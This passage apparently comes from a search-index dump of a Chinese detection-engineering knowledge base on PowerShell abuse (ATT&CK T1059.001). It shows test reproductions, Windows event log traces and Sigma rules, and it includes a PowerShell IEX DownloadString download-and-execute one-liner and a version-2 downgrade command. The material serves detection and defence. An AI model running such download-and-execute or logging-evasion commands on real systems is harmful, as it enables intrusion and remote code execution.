Powershell\uff0c\u6839\u636e\u9700\u6c42\u6253\u5f00\u53f3\u4fa7\u6240\u9700\u8981\u7684\u65e5\u5fd7\u529f\u80fd\uff1b \u6d4b\u8bd5\u590d\u73b0 Microsoft Windows [\u7248\u672c 10.0.14393] (c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\12306br0>powershell -v 2 \u672a\u5b89\u88c5 .NET Framework \u7248\u672c v2.0.50727\uff0c\u8fd0\u884c Windows PowerShell \u7248\u672c 2 \u9700\u8981\u6b64\u7248\u672c\u7684 .NET Framework\u3002 \u6d4b\u8bd5\u7559\u75d5 \u4e8b\u4ef6ID\uff1a4688 \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x507DC \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x1158 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x17cc \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: powershell -v 2 \u201c\u4ee4\u724c\u63d0\u5347\u7c7b\u578b\u201d\u8868\u793a\u6839\u636e\u7528\u6237\u5e10\u6237\u63a7\u5236\u7b56\u7565\u5206\u914d\u7ed9\u65b0\u8fdb\u7a0b\u7684\u4ee4\u724c\u7c7b\u578b\u3002 \u7c7b\u578b 1 \u662f\u672a\u5220\u9664\u7279\u6743\u6216\u672a\u7981\u7528\u7ec4\u7684\u5b8c\u5168\u4ee4\u724c\u3002\u5b8c\u5168\u4ee4\u724c\u4ec5\u5728\u7981\u7528\u4e86\u7528\u6237\u5e10\u6237\u63a7\u5236\u6216\u8005\u7528\u6237\u662f\u5185\u7f6e\u7ba1\u7406\u5458\u5e10\u6237\u6216\u670d\u52a1\u5e10\u6237\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\u3002 \u7c7b\u578b 2 \u662f\u672a\u5220\u9664\u7279\u6743\u6216\u672a\u7981\u7528\u7ec4\u7684\u63d0\u5347\u4ee4\u724c\u3002\u5f53\u542f\u7528\u4e86\u7528\u6237\u5e10\u6237\u63a7\u5236\u5e76\u4e14\u7528\u6237\u9009\u62e9\u4f7f\u7528\u201c\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8fd0\u884c\u201d\u9009\u9879\u542f\u52a8\u7a0b\u5e8f\u65f6\uff0c\u4f1a\u4f7f\u7528\u63d0\u5347\u4ee4\u724c\u3002\u5f53\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u4e3a\u59cb\u7ec8\u9700\u8981\u7ba1\u7406\u7279\u6743\u6216\u59cb\u7ec8\u9700\u8981\u6700\u9ad8\u7279\u6743\u5e76\u4e14\u7528\u6237\u662f\u7ba1\u7406\u5458\u7ec4\u7684\u6210\u5458\u65f6\uff0c\u4e5f\u4f1a\u4f7f\u7528\u63d0\u5347\u4ee4\u724c\u3002 \u7c7b\u578b 3 \u662f\u5220\u9664\u4e86\u7ba1\u7406\u7279\u6743\u5e76\u7981\u7528\u4e86\u7ba1\u7406\u7ec4\u7684\u53d7\u9650\u4ee4\u724c\u3002\u5f53\u542f\u7528\u4e86\u7528\u6237\u5e10\u6237\u63a7\u5236\uff0c\u5e94\u7528\u7a0b\u5e8f\u4e0d\u9700\u8981\u7ba1\u7406\u7279\u6743\u5e76\u4e14\u7528\u6237\u672a\u9009\u62e9\u4f7f\u7528\u201c\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8fd0\u884c\u201d\u9009\u9879\u542f\u52a8\u7a0b\u5e8f\u65f6\uff0c\u4f1a\u4f7f\u7528\u53d7\u9650\u4ee4\u724c\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u68c0\u6d4bPowerShell 2.0\u7248\u672c\u6267\u884c\u60c5\u51b5 status: experimental description: \u68c0\u6d4b\u5728powershell\u964d\u7ea7\u4f7f\u7528\uff0cwindows server 2016\u6d4b\u8bd5 tags: - attack.t1059-001 - attack.execution logsource: category: process_creation product: windows detection: selection: Image: - '*\\powershell.exe' - '*\\powershell_ise.exe' CommandLine: - '-v 2' - '-v 2.0' - '-version 2' - '-version 2.0' condition: selection level: medium \u5efa\u8bae \u53ef\u4f7f\u7528windows\u5b89\u5168\u65e5\u5fd7\u3001Powershell\u65e5\u5fd7\u3001Sysmon\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1059-001 https://attack.mitre.org/techniques/T1059/001/ \u68c0\u6d4b\u548c\u7f13\u89e3PowerShell\u653b\u51fb\u7684\u65b9\u6cd5 https://blog.csdn.net/qq_36334464/article/details/101519839 PowerShell\u7248\u672c2.0\u6267\u884c https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/powershell-version-2.0-execution.md Powershell\u4e0e\u5a01\u80c1\u72e9\u730e https://www.freebuf.com/articles/terminal/267080.html","title":"T1059-001-win-\u68c0\u6d4bPowershell2.0\u7248\u672c\u6267\u884c\u60c5\u51b5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#t1059-001-win-powershell20","text":"","title":"T1059-001-win-\u68c0\u6d4bPowershell2.0\u7248\u672c\u6267\u884c\u60c5\u51b5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528PowerShell\u6765\u6267\u884c\u547d\u4ee4\u548c\u811a\u672c\u3002PowerShell\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u529f\u80fd\u5f3a\u5927\u7684\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u754c\u9762\u548c\u811a\u672c\u73af\u5883\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528PowerShell\u6267\u884c\u8bb8\u591a\u64cd\u4f5c\uff0c\u5305\u62ec\u53d1\u73b0\u4fe1\u606f\u548c\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u793a\u4f8b\u5305\u62ecStart-Process\u53ef\u7528\u4e8e\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\u7684Invoke-Commandcmdlet\u548c\u53ef\u5728\u672c\u5730\u6216\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884c\u547d\u4ee4\u7684cmdlet\uff08\u5c3d\u7ba1\u4f7f\u7528PowerShell\u8fde\u63a5\u5230\u8fdc\u7a0b\u7cfb\u7edf\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff09\u3002 PowerShell\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4eceInternet\u4e0b\u8f7d\u5e76\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd9\u4e9b\u53ef\u6267\u884c\u6587\u4ef6\u53ef\u4ee5\u4ece\u78c1\u76d8\u6216\u5185\u5b58\u4e2d\u6267\u884c\u800c\u65e0\u9700\u63a5\u89e6\u78c1\u76d8\u3002 \u63d0\u4f9b\u4e86\u8bb8\u591a\u57fa\u4e8ePowerShell\u7684\u653b\u51fb\u6027\u6d4b\u8bd5\u5de5\u5177\uff0c\u5305\u62ecEmpire\uff0cPowerSploit\uff0cPoshC2\u548cPSAttack\u3002 \u8fd8\u53ef\u4ee5\u6267\u884cPowerShell\u547d\u4ee4\u6d3b\u811a\u672c\uff0c\u800c\u65e0\u9700\u901a\u8fc7.NET\u6846\u67b6\u548cWindows\u516c\u5171\u8bed\u8a00\u63a5\u53e3\uff08CLI\uff09\u516c\u5f00\u7684powershell.exePowerShell\u5e95\u5c42System.Management.Automation\u7a0b\u5e8f\u96c6DLL\u7684\u63a5\u53e3\u76f4\u63a5\u8c03\u7528\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_1","text":"\u67e5\u627ePowerShell\u7248\u672c2.0\u7684\u6267\u884c\u60c5\u51b5\uff0c\u800c\u4e0d\u662f\u67e5\u627e\u4f7f\u7528\u7248\u672c2\u7684\u65e7\u811a\u672c\uff0c\u6216\u67e5\u627e\u8bd5\u56fe\u4ece\u811a\u672c\u65e5\u5fd7\u8bb0\u5f55\u548cAMSI\u4e2d\u9690\u85cf\u7684\u653b\u51fb\u8005\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#powershell-v20","text":"\u8be5\u7248\u672c\u8f83\u65e7\u4e14\u4e0d\u5b89\u5168\uff0c\u5728\u5b89\u88c5\u7248\u672c5\u65f6\u4e0d\u4f1a\u5220\u9664\u3002\u5982\u679c\u672a\u88ab\u5220\u9664\uff0c\u653b\u51fb\u8005\u4ecd\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u4e0d\u5b89\u5168\u7684\u7248\u672c\u3002(powershell.exe -Version 2.0 -Command { } -ExecutionPolicy )","title":"Powershell v2.0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_2","text":"Windows powershell\u65e5\u5fd7\u5ba1\u6838\u7b56\u7565 \u6309Win+R\u6253\u5f00Windows\u8fd0\u884c\u7a97\u53e3,\u5728\u8f93\u5165\u6846\u91cc\u8f93\u5165gepdit.msc,\u6253\u5f00Windows\u672c\u5730\u7ec4\u7b56\u7565\u7f16\u8f91\u5668; \u627e\u5230\u8ba1\u7b97\u673a\u914d\u7f6e/\u7ba1\u7406\u6a21\u677f/Windows\u7ec4\u4ef6/Windows Powershell\uff0c\u6839\u636e\u9700\u6c42\u6253\u5f00\u53f3\u4fa7\u6240\u9700\u8981\u7684\u65e5\u5fd7\u529f\u80fd\uff1b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_3","text":"Microsoft Windows [\u7248\u672c 10.0.14393] (c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\12306br0>powershell -v 2 \u672a\u5b89\u88c5 .NET Framework \u7248\u672c v2.0.50727\uff0c\u8fd0\u884c Windows PowerShell \u7248\u672c 2 \u9700\u8981\u6b64\u7248\u672c\u7684 .NET Framework\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_4","text":"\u4e8b\u4ef6ID\uff1a4688 \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x507DC \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x1158 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x17cc \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: powershell -v 2 \u201c\u4ee4\u724c\u63d0\u5347\u7c7b\u578b\u201d\u8868\u793a\u6839\u636e\u7528\u6237\u5e10\u6237\u63a7\u5236\u7b56\u7565\u5206\u914d\u7ed9\u65b0\u8fdb\u7a0b\u7684\u4ee4\u724c\u7c7b\u578b\u3002 \u7c7b\u578b 1 \u662f\u672a\u5220\u9664\u7279\u6743\u6216\u672a\u7981\u7528\u7ec4\u7684\u5b8c\u5168\u4ee4\u724c\u3002\u5b8c\u5168\u4ee4\u724c\u4ec5\u5728\u7981\u7528\u4e86\u7528\u6237\u5e10\u6237\u63a7\u5236\u6216\u8005\u7528\u6237\u662f\u5185\u7f6e\u7ba1\u7406\u5458\u5e10\u6237\u6216\u670d\u52a1\u5e10\u6237\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\u3002 \u7c7b\u578b 2 \u662f\u672a\u5220\u9664\u7279\u6743\u6216\u672a\u7981\u7528\u7ec4\u7684\u63d0\u5347\u4ee4\u724c\u3002\u5f53\u542f\u7528\u4e86\u7528\u6237\u5e10\u6237\u63a7\u5236\u5e76\u4e14\u7528\u6237\u9009\u62e9\u4f7f\u7528\u201c\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8fd0\u884c\u201d\u9009\u9879\u542f\u52a8\u7a0b\u5e8f\u65f6\uff0c\u4f1a\u4f7f\u7528\u63d0\u5347\u4ee4\u724c\u3002\u5f53\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u4e3a\u59cb\u7ec8\u9700\u8981\u7ba1\u7406\u7279\u6743\u6216\u59cb\u7ec8\u9700\u8981\u6700\u9ad8\u7279\u6743\u5e76\u4e14\u7528\u6237\u662f\u7ba1\u7406\u5458\u7ec4\u7684\u6210\u5458\u65f6\uff0c\u4e5f\u4f1a\u4f7f\u7528\u63d0\u5347\u4ee4\u724c\u3002 \u7c7b\u578b 3 \u662f\u5220\u9664\u4e86\u7ba1\u7406\u7279\u6743\u5e76\u7981\u7528\u4e86\u7ba1\u7406\u7ec4\u7684\u53d7\u9650\u4ee4\u724c\u3002\u5f53\u542f\u7528\u4e86\u7528\u6237\u5e10\u6237\u63a7\u5236\uff0c\u5e94\u7528\u7a0b\u5e8f\u4e0d\u9700\u8981\u7ba1\u7406\u7279\u6743\u5e76\u4e14\u7528\u6237\u672a\u9009\u62e9\u4f7f\u7528\u201c\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8fd0\u884c\u201d\u9009\u9879\u542f\u52a8\u7a0b\u5e8f\u65f6\uff0c\u4f1a\u4f7f\u7528\u53d7\u9650\u4ee4\u724c\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#sigma","text":"title: \u68c0\u6d4bPowerShell 2.0\u7248\u672c\u6267\u884c\u60c5\u51b5 status: experimental description: \u68c0\u6d4b\u5728powershell\u964d\u7ea7\u4f7f\u7528\uff0cwindows server 2016\u6d4b\u8bd5 tags: - attack.t1059-001 - attack.execution logsource: category: process_creation product: windows detection: selection: Image: - '*\\powershell.exe' - '*\\powershell_ise.exe' CommandLine: - '-v 2' - '-v 2.0' - '-version 2' - '-version 2.0' condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_6","text":"\u53ef\u4f7f\u7528windows\u5b89\u5168\u65e5\u5fd7\u3001Powershell\u65e5\u5fd7\u3001Sysmon\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell2.0%E7%89%88%E6%9C%AC%E6%89%A7%E8%A1%8C/#_7","text":"MITRE-ATT&CK-T1059-001 https://attack.mitre.org/techniques/T1059/001/ \u68c0\u6d4b\u548c\u7f13\u89e3PowerShell\u653b\u51fb\u7684\u65b9\u6cd5 https://blog.csdn.net/qq_36334464/article/details/101519839 PowerShell\u7248\u672c2.0\u6267\u884c https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/powershell-version-2.0-execution.md Powershell\u4e0e\u5a01\u80c1\u72e9\u730e https://www.freebuf.com/articles/terminal/267080.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/","text":"T1059-001-win-\u68c0\u6d4bPowershell\u4e0b\u8f7d\u6587\u4ef6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528PowerShell\u6765\u6267\u884c\u547d\u4ee4\u548c\u811a\u672c\u3002PowerShell\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u529f\u80fd\u5f3a\u5927\u7684\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u754c\u9762\u548c\u811a\u672c\u73af\u5883\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528PowerShell\u6267\u884c\u8bb8\u591a\u64cd\u4f5c\uff0c\u5305\u62ec\u53d1\u73b0\u4fe1\u606f\u548c\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u793a\u4f8b\u5305\u62ecStart-Process\u53ef\u7528\u4e8e\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\u7684Invoke-Commandcmdlet\u548c\u53ef\u5728\u672c\u5730\u6216\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884c\u547d\u4ee4\u7684cmdlet\uff08\u5c3d\u7ba1\u4f7f\u7528PowerShell\u8fde\u63a5\u5230\u8fdc\u7a0b\u7cfb\u7edf\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff09\u3002 PowerShell\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4eceInternet\u4e0b\u8f7d\u5e76\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd9\u4e9b\u53ef\u6267\u884c\u6587\u4ef6\u53ef\u4ee5\u4ece\u78c1\u76d8\u6216\u5185\u5b58\u4e2d\u6267\u884c\u800c\u65e0\u9700\u63a5\u89e6\u78c1\u76d8\u3002 \u63d0\u4f9b\u4e86\u8bb8\u591a\u57fa\u4e8ePowerShell\u7684\u653b\u51fb\u6027\u6d4b\u8bd5\u5de5\u5177\uff0c\u5305\u62ecEmpire\uff0cPowerSploit\uff0cPoshC2\u548cPSAttack\u3002 \u8fd8\u53ef\u4ee5\u6267\u884cPowerShell\u547d\u4ee4\u6d3b\u811a\u672c\uff0c\u800c\u65e0\u9700\u901a\u8fc7.NET\u6846\u67b6\u548cWindows\u516c\u5171\u8bed\u8a00\u63a5\u53e3\uff08CLI\uff09\u516c\u5f00\u7684powershell.exePowerShell\u5e95\u5c42System.Management.Automation\u7a0b\u5e8f\u96c6DLL\u7684\u63a5\u53e3\u76f4\u63a5\u8c03\u7528\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u68c0\u6d4b\u65e5\u5fd7 Windows powershell\u65e5\u5fd7\u5ba1\u6838\u7b56\u7565 \u6309Win+R\u6253\u5f00Windows\u8fd0\u884c\u7a97\u53e3,\u5728\u8f93\u5165\u6846\u91cc\u8f93\u5165gepdit.msc,\u6253\u5f00Windows\u672c\u5730\u7ec4\u7b56\u7565\u7f16\u8f91\u5668; \u627e\u5230\u8ba1\u7b97\u673a\u914d\u7f6e/\u7ba1\u7406\u6a21\u677f/Windows\u7ec4\u4ef6/Windows Powershell\uff0c\u6839\u636e\u9700\u6c42\u6253\u5f00\u53f3\u4fa7\u6240\u9700\u8981\u7684\u65e5\u5fd7\u529f\u80fd\uff1b \u6d4b\u8bd5\u590d\u73b0 PS C:\\Users\\12306br0> IEX (New-Object System.Net.Webclient).DownloadString('http://blog.csdn.net/huangxvhui88/article/de tails/89361287') \u6d4b\u8bd5\u7559\u75d5 Powershell\u4e8b\u4ef6ID\uff1a4104 \u6b63\u5728\u521b\u5efa Scriptblock \u6587\u672c(\u5df2\u5b8c\u6210 1\uff0c\u5171 1): IEX (New-Object System.Net.Webclient).DownloadString('http://blog.csdn.net/huangxvhui88/article/details/89361287') ScriptBlock ID: e9f29288-34e7-497f-8fff-9a6cf6c355da \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u68c0\u6d4bPowerShell\u4e0b\u8f7d\u6587\u4ef6\u884c\u4e3a status: experimental description: \u68c0\u6d4b\u5728powershell\u4e0b\u8f7d\u6587\u4ef6\u884c\u4e3a\uff0cwindows server 2016\u6d4b\u8bd5 tags: - attack.t1059-001 - attack.execution logsource: category: process_creation product: windows detection: selection: Image: - '*\\powershell.exe' - '*\\powershell_ise.exe' CommandLine: - '*Net.WebClient*' - '*DownloadFile*' - '*Invoke-WebRequest*' - '*Invoke-Shellcode*' - '*http*' - '*Start-BitsTransfer*' - '*IEX*' - '*mpcmdrun.exe*' condition: selection level: medium \u5efa\u8bae \u5728\u4f7f\u7528Powershell\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\u65f6\uff0c\u6211\u4eec\u4e0d\u5efa\u8bae\u4f7f\u7528\u8fdb\u7a0b\u540d\u79f0\u52a0\u547d\u4ee4\u884c\u5173\u952e\u8bcd\u5339\u914d\u7684\u65b9\u5f0f\u8fdb\u884c\u68c0\u6d4b\u3002\u56e0\u4e3aPowershell\u4e8b\u4ef6ID\uff1a4104\u4e2d\u5e76\u4e0d\u5305\u542b\u8fdb\u7a0b\u4fe1\u606f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1059-001 https://attack.mitre.org/techniques/T1059/001/ PowerShell \u4e0b\u8f7d\u6587\u4ef6 https://www.pstips.net/powershell-download-files.html \u68c0\u6d4bPowershell\u4e0b\u8f7d\u6587\u4ef6\u884c\u4e3a https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/PowerShell%20downloads.txt Powershell\u4e0e\u5a01\u80c1\u72e9\u730e https://www.freebuf.com/articles/terminal/267080.html","title":"T1059-001-win-\u68c0\u6d4bPowershell\u4e0b\u8f7d\u6587\u4ef6"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#t1059-001-win-powershell","text":"","title":"T1059-001-win-\u68c0\u6d4bPowershell\u4e0b\u8f7d\u6587\u4ef6"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528PowerShell\u6765\u6267\u884c\u547d\u4ee4\u548c\u811a\u672c\u3002PowerShell\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u529f\u80fd\u5f3a\u5927\u7684\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u754c\u9762\u548c\u811a\u672c\u73af\u5883\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528PowerShell\u6267\u884c\u8bb8\u591a\u64cd\u4f5c\uff0c\u5305\u62ec\u53d1\u73b0\u4fe1\u606f\u548c\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u793a\u4f8b\u5305\u62ecStart-Process\u53ef\u7528\u4e8e\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\u7684Invoke-Commandcmdlet\u548c\u53ef\u5728\u672c\u5730\u6216\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884c\u547d\u4ee4\u7684cmdlet\uff08\u5c3d\u7ba1\u4f7f\u7528PowerShell\u8fde\u63a5\u5230\u8fdc\u7a0b\u7cfb\u7edf\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff09\u3002 PowerShell\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4eceInternet\u4e0b\u8f7d\u5e76\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd9\u4e9b\u53ef\u6267\u884c\u6587\u4ef6\u53ef\u4ee5\u4ece\u78c1\u76d8\u6216\u5185\u5b58\u4e2d\u6267\u884c\u800c\u65e0\u9700\u63a5\u89e6\u78c1\u76d8\u3002 \u63d0\u4f9b\u4e86\u8bb8\u591a\u57fa\u4e8ePowerShell\u7684\u653b\u51fb\u6027\u6d4b\u8bd5\u5de5\u5177\uff0c\u5305\u62ecEmpire\uff0cPowerSploit\uff0cPoshC2\u548cPSAttack\u3002 \u8fd8\u53ef\u4ee5\u6267\u884cPowerShell\u547d\u4ee4\u6d3b\u811a\u672c\uff0c\u800c\u65e0\u9700\u901a\u8fc7.NET\u6846\u67b6\u548cWindows\u516c\u5171\u8bed\u8a00\u63a5\u53e3\uff08CLI\uff09\u516c\u5f00\u7684powershell.exePowerShell\u5e95\u5c42System.Management.Automation\u7a0b\u5e8f\u96c6DLL\u7684\u63a5\u53e3\u76f4\u63a5\u8c03\u7528\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#_1","text":"Windows powershell\u65e5\u5fd7\u5ba1\u6838\u7b56\u7565 \u6309Win+R\u6253\u5f00Windows\u8fd0\u884c\u7a97\u53e3,\u5728\u8f93\u5165\u6846\u91cc\u8f93\u5165gepdit.msc,\u6253\u5f00Windows\u672c\u5730\u7ec4\u7b56\u7565\u7f16\u8f91\u5668; \u627e\u5230\u8ba1\u7b97\u673a\u914d\u7f6e/\u7ba1\u7406\u6a21\u677f/Windows\u7ec4\u4ef6/Windows Powershell\uff0c\u6839\u636e\u9700\u6c42\u6253\u5f00\u53f3\u4fa7\u6240\u9700\u8981\u7684\u65e5\u5fd7\u529f\u80fd\uff1b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#_2","text":"PS C:\\Users\\12306br0> IEX (New-Object System.Net.Webclient).DownloadString('http://blog.csdn.net/huangxvhui88/article/de tails/89361287')","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#_3","text":"Powershell\u4e8b\u4ef6ID\uff1a4104 \u6b63\u5728\u521b\u5efa Scriptblock \u6587\u672c(\u5df2\u5b8c\u6210 1\uff0c\u5171 1): IEX (New-Object System.Net.Webclient).DownloadString('http://blog.csdn.net/huangxvhui88/article/details/89361287') ScriptBlock ID: e9f29288-34e7-497f-8fff-9a6cf6c355da","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#_4","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#sigma","text":"title: \u68c0\u6d4bPowerShell\u4e0b\u8f7d\u6587\u4ef6\u884c\u4e3a status: experimental description: \u68c0\u6d4b\u5728powershell\u4e0b\u8f7d\u6587\u4ef6\u884c\u4e3a\uff0cwindows server 2016\u6d4b\u8bd5 tags: - attack.t1059-001 - attack.execution logsource: category: process_creation product: 